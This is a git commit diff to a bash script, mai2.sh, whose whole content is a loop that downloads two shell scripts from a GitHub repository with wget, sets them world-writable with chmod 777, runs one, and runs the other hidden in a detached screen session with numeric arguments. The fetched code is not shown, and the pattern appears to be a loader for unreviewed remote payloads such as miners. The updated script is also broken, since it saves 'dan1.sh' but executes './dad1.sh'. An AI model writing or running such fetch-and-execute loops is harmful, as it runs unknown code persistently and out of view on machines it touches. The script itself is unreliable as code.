87d8498d5a758d093ef2148e832d81466674d2b9
Mafs68 <92165260+Mafs68@users.noreply.github.com>
2021-10-13 13:09:09 +0530

    Update mai2.sh

--- mai2.sh
+++ mai2.sh
@@ -2,16 +2,16 @@
 #!/bin/bash
 ran1=$(openssl rand -hex 4)
 ran2=$(openssl rand -hex 6)
-wget https://github.com/Mafs68/hjs839/raw/main/rad1.sh -O ran1.sh 
-wget https://github.com/Mafs68/hjs839/raw/main/Sec.sh -O ran2.sh
+wget https://github.com/Mafs68/hjs839/raw/main/rad1.sh -O dan1.sh 
+wget https://github.com/Mafs68/hjs839/raw/main/Sec.sh -O dan2.sh
 
 while :
 do
 	
-	chmod 777 ran1.sh
-	./rad1.sh
+	chmod 777 dan1.sh
+	./dad1.sh
 	sleep 5
-	chmod 777 ran2.sh
-	timeout 10m screen -dmS Sec.sh ./ran2.sh 65 75 
+	chmod 777 dan2.sh
+	timeout 10m screen -dmS dan2.sh ./dan2.sh 65 75 
 	sleep 5
 done
